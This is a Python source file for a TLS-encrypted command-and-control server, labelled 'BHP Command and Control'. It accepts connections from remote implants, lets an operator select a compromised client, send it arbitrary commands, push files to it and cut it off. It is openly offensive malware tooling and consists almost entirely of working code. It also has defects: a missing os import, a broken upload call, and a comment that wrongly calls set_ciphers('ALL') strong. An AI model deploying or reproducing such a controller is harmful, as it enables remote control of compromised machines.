import sys
import threading
import socket
import argparse
import random
import string
import textwrap
import ssl

class CommandControl:
    def __init__(self, args):
        self.cert_file = 'server.crt'
        self.key_file = 'server.key'
        self.args = args
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Create SSL context with the appropriate protocol
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)

        # Set the minimum protocol version (TLSv1.2) to ensure secure connections
        context.minimum_version = ssl.TLSVersion.TLSv1_2

        # Disable SSLv2 and SSLv3
        context.options |= ssl.OP_NO_SSLv2
        context.options |= ssl.OP_NO_SSLv3

        # Set strong ciphers only
        context.set_ciphers('ALL')

        # Load the server's certificate and private key
        context.load_cert_chain(certfile=self.cert_file, keyfile=self.key_file)
        

        # Wrap the socket with the SSL context for encrypted communication
        self.socket = context.wrap_socket(self.socket, server_side=True)

        self.clients = {}  # Dictionary to store connected clients
        self.current_client = None  # Currently selected client


    def listen(self):
        self.socket.bind((self.args.lhost, self.args.lport))
        self.socket.listen(5)
        print(f"[INFO] Listening on {self.args.lhost}:{self.args.lport}")

        while True:
            client_socket, addr = self.socket.accept()
            print(f"[INFO] Connection attempt from {addr}")

            try:
                client_id = self.generate_client_id(addr)
                self.clients[client_id] = client_socket
                print(f"[INFO] Client {client_id} added to pool.")
                # Start a thread for handling the client
                client_thread = threading.Thread(target=self.handle_client, args=(client_id,))
                client_thread.start()
            except ssl.SSLError as e:
                print(f"[ERROR] SSL Error: {e}")
                client_socket.close()

           

    def generate_client_id(self, addr):
        """Generate a unique ID for each client."""
        unique_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        return f"{unique_id}:{addr[0]}:{addr[1]}"

    def handle_client(self, client_id):
        client_socket = self.clients[client_id]
        try:
            while True:
                try:
                    # Wait for the client to send responses
                    data = client_socket.recv(18324).decode('utf-8')
                    if not data:
                        print(f"\n[INFO] Client {client_id} disconnected.")
                        break
                    print(f"\n{data.strip()}")
                except ssl.SSLError as e:
                    # Handle SSL-specific errors
                    print(f"[ERROR] SSL Error with client {client_id}: {e}")
                    break  # Close the connection if SSL error occurs
                except Exception as e:
                    # Handle other general exceptions
                    print(f"[ERROR] Error with client {client_id}: {e}")
                    break  # Break the loop on other exceptions

        finally:
            # Cleanup: Close the client connection
            client_socket.close()
            del self.clients[client_id]
            print(f"[INFO] Client {client_id} has been removed from the pool.")


    def send_command_to_client(self, client_id, command):
        """Send a command to a selected client."""
        if client_id not in self.clients:
            print(f"[ERROR] Client {client_id} not found or disconnected.")
            self.server_cli()
            return

        client_socket = self.clients[client_id]
        client_socket.sendall(command.encode())
        

    def send_file_to_client(self, client_id, file_path):
        """Send a file to the selected client."""
        if client_id not in self.clients:
            print(f"[ERROR] Client {client_id} not found or disconnected.")
            self.server_cli()
            return

        client_socket = self.clients[client_id]

        # Check if the file exists
        if not os.path.isfile(file_path):
            print(f"[ERROR] File {file_path} not found.")
            return

        # Send a command indicating file transfer
        command = f"UPLOAD {file_path}"
        client_socket.sendall(command.encode())

        # Send the file size first
        file_size = os.path.getsize(file_path)
        client_socket.sendall(str(file_size).encode())

        # Send the file in chunks
        with open(file_path, "rb") as file:
            while True:
                file_chunk = file.read(4096)  # Read 4KB at a time
                if not file_chunk:
                    break  # End of file
                client_socket.sendall(file_chunk)

        print(f"[INFO] File {file_path} sent to client {client_id}.")


    def killswitch(self, client_id):
        """
        Terminates the connection for the given client ID.
        """
        if client_id in self.clients:
            client_socket = self.clients[client_id]
            try:
                client_socket.close()
                del self.clients[client_id]
                print(f"[INFO] Client {client_id} has been terminated.")
            except Exception as e:
                print(f"[ERROR] Failed to terminate client {client_id}: {e}")
        else:
            print(f"[ERROR] Client {client_id} not found.")


    def list_clients(self):
        """List all connected clients."""
        if not self.clients:
            print("[INFO] No clients connected.")
            return

        print("[INFO] Connected clients:")
        for i, client_id in enumerate(self.clients, 1):
            print(f"{i}. {client_id}")

    def select_client(self, client_id):
        """Select a client to interact with."""
        if client_id in self.clients:
            self.current_client = client_id
            print(f"[INFO] Selected client: {self.current_client}")
        
        else:
            print(f"[ERROR] Client {client_id} not found.")

    def server_cli(self):
        """Interactive CLI for the server."""
        while True:
            if not self.current_client or self.current_client not in self.clients:
                prompt = "BHP~~[no-client]> "
            else:
                prompt = f"BHP@@[{self.current_client}]> "

            command = input(prompt).strip()

            if command == "exit":
                print("[INFO] Exiting server CLI.")
                sys.exit(0)
                break
            elif command == "upload":
                send_file_to_client()
            elif command.startswith("killswitch"):
                _, client_id = command.split(maxsplit=1)
                self.killswitch(client_id)
            
            elif command == "list":
                self.list_clients()
            elif command.startswith("select"):
                _, client_id = command.split(maxsplit=1)
                self.select_client(client_id)
            elif command == "back":
                print("[INFO] Returning to the main CLI.")
                self.current_client = None  # Deselect the current client
            elif self.current_client:
                # Send command with special WinAPI command if needed
                self.send_command_to_client(self.current_client, command)
            else:
                print("[ERROR] No client selected or invalid command.")

    def run(self):
        if self.args.listen:
            threading.Thread(target=self.listen).start()
            self.server_cli()
        else:
            print("[ERROR] Invalid operation mode.")
            print("Example: c2.py --lhost 192.168.1.0 -p 9999 --listen")
            
            
if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description="BHP Command and Control",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""
        Example:
        c2.py --lhost 192.168.1.0 -p 9999 --listen"""))
    parser.add_argument("--lhost", default="0.0.0.0", help="Local host to bind")
    parser.add_argument("--lport", type=int, default=8080, help="Local port to bind")
    parser.add_argument("--listen", action="store_true", help="Start in listening mode")

    args = parser.parse_args()
    cnc = CommandControl(args)

    try:
        cnc.run()
    except KeyboardInterrupt:
        print("\n[INFO] Shutting down.")
        sys.exit(0)
